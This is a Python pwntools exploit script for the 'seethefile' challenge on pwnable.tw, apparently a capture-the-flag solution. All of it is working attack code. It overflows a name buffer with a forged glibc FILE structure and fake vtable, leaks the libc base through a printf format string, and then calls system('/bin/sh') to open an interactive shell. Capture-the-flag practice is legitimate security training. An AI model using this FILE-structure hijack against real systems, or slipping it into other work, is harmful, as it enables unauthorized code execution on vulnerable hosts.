#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("seethefile_patched", checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *0x08048b0f
b *_IO_file_close_it+271
b *fclose+229
b *0x2a932d1f
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(0.5)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10200
        return remote(host, port)

p = conn()

def open_file(filename):
    slan(p, b'choice', 1)
    sla(p, b'see', filename)

def read_file():
    slan(p, b'choice', 2)

def write_file():
    slan(p, b'choice', 3)

def close_file():
    slan(p, b'choice', 4)

def leave(name):
    slan(p, b'choice', 5)
    sla(p, b'name', name)

maps = b'/proc/self/maps'
open_file(maps)

print("leak libc")

name = 0x804b260
fake_vtable = name + 0x100
fake_fp = flat({
    0x0: 0xfbad2801, # flags
    0x4: b'libc=%3$p',
    0x20: name, # fp
    0x34: 0, # _chain
    0x38: 1, # _fileno
    0x48: 0x804b064, # _lock
    0x94: fake_vtable, # vtable
    
    0x100: 0,
    0x100 + 0x8: exe.symbols['main'],
    0x100 + 0x44: exe.plt['printf']
}, filler=b'\0')

sleep(0.25)

leave(fake_fp)

ru(p, b'next time')
ru(p, b'libc=')
libc.address = leak_hex(rn(p, 10), 0x1b0000)
lg("libc base", libc.address)
lg("system", libc.symbols['system'])

print("spawn shell")

fake_fp = flat({
    0x0: b'/bin/sh\0',
    0x20: name, # fp
    0x34: 0, # _chain
    0x38: 1, # _fileno
    0x48: 0x804b064, # _lock
    0x94: fake_vtable, # vtable
    
    0x100: 0,
    0x100 + 0x44: libc.symbols['system'],
}, filler=b'\0')

sleep(0.25)

leave(fake_fp)

rr(p, 1)
ia(p)